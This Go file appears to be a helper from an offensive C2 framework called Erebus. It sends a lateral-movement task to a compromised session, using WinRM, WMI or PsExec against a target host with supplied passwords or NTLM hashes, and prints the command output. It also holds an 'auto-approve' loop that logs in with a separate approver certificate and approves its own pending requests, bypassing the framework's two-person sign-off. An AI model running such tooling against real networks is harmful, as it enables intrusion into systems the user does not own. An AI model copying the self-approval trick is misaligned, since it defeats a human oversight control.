//go:build ignore

package main

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"flag"
	"fmt"
	"os"
	"time"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/protobuf/proto"
)

func main() {
	server := flag.String("server", "127.0.0.1:50051", "")
	session := flag.String("session", "", "required")
	method := flag.String("method", "winrm", "winrm|wmi|psexec")
	target := flag.String("target", "", "")
	command := flag.String("command", "whoami", "")
	user := flag.String("user", "", "")
	pass := flag.String("pass", "", "")
	domain := flag.String("domain", "", "")
	hash := flag.String("hash", "", "")
	opCert := flag.String("op-cert", os.ExpandEnv("$HOME/.erebus/certs/operator.pem"), "")
	opKey := flag.String("op-key", os.ExpandEnv("$HOME/.erebus/certs/operator-key.pem"), "")
	apCert := flag.String("ap-cert", os.ExpandEnv("$HOME/.erebus/certs/approver.pem"), "")
	apKey := flag.String("ap-key", os.ExpandEnv("$HOME/.erebus/certs/approver-key.pem"), "")
	ca := flag.String("ca", os.ExpandEnv("$HOME/.erebus/certs/ca.pem"), "")
	flag.Parse()
	if *session == "" || *target == "" {
		fatal(fmt.Errorf("need -session and -target"))
	}

	op := mustDial(*server, *opCert, *opKey, *ca)
	defer op.Close()
	opC := pb.NewErebusC2Client(op)
	ap := mustDial(*server, *apCert, *apKey, *ca)
	defer ap.Close()
	apC := pb.NewErebusC2Client(ap)

	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()

	cfg := &pb.LateralMoveConfig{
		Method:   *method,
		Target:   *target,
		Command:  *command,
		Username: *user,
		Password: *pass,
		Domain:   *domain,
		NtlmHash: *hash,
	}
	data, _ := proto.Marshal(cfg)

	type result struct {
		resp *pb.ExecuteTaskResponse
		err  error
	}
	done := make(chan result, 1)
	go func() {
		r, err := opC.ExecuteTask(ctx, &pb.ExecuteTaskRequest{
			SessionId: *session,
			TaskType:  pb.TaskType_TASK_LATERAL_MOVE,
			Data:      data,
			Wait:      true,
			TimeoutMs: 90000,
		})
		done <- result{r, err}
	}()

	// auto-approve
	deadline := time.Now().Add(30 * time.Second)
	for time.Now().Before(deadline) {
		select {
		case r := <-done:
			printRes(r)
			return
		default:
		}
		pend, err := apC.ListPendingApprovals(ctx, &pb.ListPendingApprovalsRequest{})
		if err == nil {
			for _, a := range pend.Approvals {
				if a.SessionId == *session {
					if _, err := apC.Approve(ctx, &pb.ApproveRequest{ApprovalId: a.Id}); err == nil {
						fmt.Println("approved", a.Id)
					}
				}
			}
		}
		time.Sleep(150 * time.Millisecond)
	}
	r := <-done
	printRes(r)
}

func printRes(r struct {
	resp *pb.ExecuteTaskResponse
	err  error
}) {
	if r.err != nil {
		fatal(r.err)
	}
	if r.resp.Result == nil {
		fatal(fmt.Errorf("nil result"))
	}
	fmt.Printf("success=%v err=%q\n", r.resp.Result.Success, r.resp.Result.Error)
	var lr pb.LateralMoveResult
	if err := proto.Unmarshal(r.resp.Result.Data, &lr); err == nil {
		fmt.Printf("method=%s target=%s success=%v\n--- output ---\n%s\n", lr.Method, lr.Target, lr.Success, lr.Output)
		return
	}
	fmt.Printf("raw data %d bytes\n", len(r.resp.Result.Data))
}

func mustDial(addr, cert, key, caPath string) *grpc.ClientConn {
	certPair, err := tls.LoadX509KeyPair(cert, key)
	if err != nil {
		fatal(err)
	}
	pem, err := os.ReadFile(caPath)
	if err != nil {
		fatal(err)
	}
	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM(pem) {
		fatal(fmt.Errorf("bad ca"))
	}
	conn, err := grpc.NewClient(addr, grpc.WithTransportCredentials(credentials.NewTLS(&tls.Config{
		Certificates: []tls.Certificate{certPair},
		RootCAs:      pool,
		MinVersion:   tls.VersionTLS12,
	})))
	if err != nil {
		fatal(err)
	}
	return conn
}

func fatal(err error) {
	fmt.Fprintln(os.Stderr, "error:", err)
	os.Exit(1)
}
